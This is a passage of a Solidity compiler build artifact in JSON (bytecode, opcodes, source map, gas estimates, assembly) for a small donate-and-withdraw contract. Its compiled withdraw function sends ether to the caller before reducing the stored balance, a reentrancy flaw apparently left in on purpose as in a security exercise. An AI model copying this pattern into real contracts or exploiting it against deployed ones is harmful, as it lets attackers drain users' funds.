8185875af1925050503d80600081146102ea576040519150601f19603f3d011682016040523d82523d6000602084013e6102ef565b606091505b50509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561040a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea264697066735822122064a5caa96e52786f7176764eed41eb915850f9c309254d0e333e5a753af0ef8164736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x44A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x362A95 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x132 JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x90 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x197 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xB5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x22D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x130 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x11A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x245 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x155 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x344 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E8 CALLVALUE PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x38C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT PUSH2 0x341 JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x2EA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2EF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP2 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x40A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH5 0xA5CAA96E52 PUSH25 0x6F7176764EED41EB915850F9C309254D0E333E5A753AF0EF81 PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "116:678:1:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100425760003560e01c8062362a951461004e57806327e235e3146100925780632e1a7d4d146100f757806370a082311461013257610049565b3661004957005b600080fd5b6100906004803603602081101561006457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610197565b005b34801561009e57600080fd5b506100e1600480360360208110156100b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061022d565b6040518082815260200191505060405180910390f35b34801561010357600080fd5b506101306004803603602081101561011a57600080fd5b8101908080359060200190929190505050610245565b005b34801561013e57600080fd5b506101816004803603602081101561015557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610344565b6040518082815260200191505060405180910390f35b6101e8346000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461038c90919063ffffffff16565b6000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106103415760003373ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d80600081146102ea576040519150601f19603f3d011682016040523d82523d6000602084013e6102ef565b606091505b50509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008082840190508381101561040a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fea264697066735822122064a5caa96e52786f7176764eed41eb915850f9c309254d0e333e5a753af0ef8164736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH3 0x362A95 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x27E235E3 EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0x2E1A7D4D EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x132 JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x90 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x197 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xE1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xB5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x22D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x130 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x11A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x245 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x155 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x344 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E8 CALLVALUE PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x38C SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT PUSH2 0x341 JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x2EA JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x2EF JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP2 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x40A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH5 0xA5CAA96E52 PUSH25 0x6F7176764EED41EB915850F9C309254D0E333E5A753AF0EF81 PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ",
							"sourceMap": "116:678:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;230:107;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;178:43;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;464:290;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;345:111;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;230:107;301:28;319:9;301:8;:13;310:3;301:13;;;;;;;;;;;;;;;;:17;;:28;;;;:::i;:::-;285:8;:13;294:3;285:13;;;;;;;;;;;;;;;:44;;;;230:107;:::o;178:43::-;;;;;;;;;;;;;;;;;:::o;464:290::-;545:7;521:8;:20;530:10;521:20;;;;;;;;;;;;;;;;:31;517:230;;570:11;586:10;:15;;609:7;586:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;569:52;;;728:7;704:8;:20;713:10;704:20;;;;;;;;;;;;;;;;:31;;;;;;;;;;;517:230;;464:290;:::o;345:111::-;399:15;434:8;:14;443:4;434:14;;;;;;;;;;;;;;;;427:21;;345:111;;;:::o;2690:175:0:-;2748:7;2767:9;2783:1;2779;:5;2767:17;;2807:1;2802;:6;;2794:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2857:1;2850:8;;;2690:175;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "219600",
								"executionCost": "263",
								"totalCost": "219863"
							},
							"external": {
								"balanceOf(address)": "1240",
								"balances(address)": "1169",
								"donate(address)": "infinite",
								"withdraw(uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 116,
									"end": 794,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 116,
									"end": 794,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122064a5caa96e52786f7176764eed41eb915850f9c309254d0e333e5a753af0ef8164736f6c634300060c0033",
									".code": [
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "362A95"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "27E235E3"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "2E1A7D4D"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "70A08231"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 116,
											"end": 794,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 116,
											"end": 794,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 230,
											"end": 337,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 230,
											"end": 337,
											"name": "SWAP1",
											"source": 1
										},
										{
